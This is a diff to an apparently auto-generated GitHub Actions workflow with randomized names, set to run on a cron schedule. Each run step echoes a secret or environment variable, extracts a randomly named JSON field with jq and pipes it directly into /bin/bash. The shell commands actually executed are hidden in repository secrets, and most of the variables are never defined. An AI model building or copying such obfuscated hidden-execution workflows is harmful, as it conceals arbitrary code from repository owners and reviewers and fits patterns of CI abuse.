@@ -1,8 +1,9 @@
 name: wanf2xy
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 3/6 * * *'
+    - cron: '7 5/6 * * *'
 
 jobs:
   build:
@@ -11,16 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: wanf2xy
         env:
-          lwcn43389: ${{ secrets.lwcn43389 }}
+          zo75: ${{ secrets.zo75 }}
         run: |
-          echo $lwcn43389 | jq -r .t1046 | /bin/bash
-          echo $bldvl00650 | jq -r .mhkfz94 | /bin/bash
-          echo $vzowx8486 | jq -r .dxptt99892 | /bin/bash
-          echo $zwyx28 | jq -r .qfcwl134 | /bin/bash
-          echo $dso6 | jq -r .hzm91 | /bin/bash
-          echo $hcezb3205 | jq -r .vhbcx89 | /bin/bash
-          echo $hu9 | jq -r .beel6 | /bin/bash
-          echo $wk1 | jq -r .n9 | /bin/bash
-          echo $o48 | jq -r .slw2592 | /bin/bash
-          echo $j186 | jq -r .mw54 | /bin/bash
+          echo $zo75 | jq -r .xjlt50096 | /bin/bash
+          echo $wrqn48 | jq -r .sy20 | /bin/bash
+          echo $phm4 | jq -r .gvjqs611 | /bin/bash
+          echo $hm23 | jq -r .pkwpt51259 | /bin/bash
+          echo $ainfz02 | jq -r .cppf7647 | /bin/bash
+          echo $e9472 | jq -r .fz29542 | /bin/bash
+          echo $spy43 | jq -r .erl78 | /bin/bash
+          echo $lipwq56884 | jq -r .i43344 | /bin/bash
+          echo $xa1 | jq -r .fr2 | /bin/bash
 
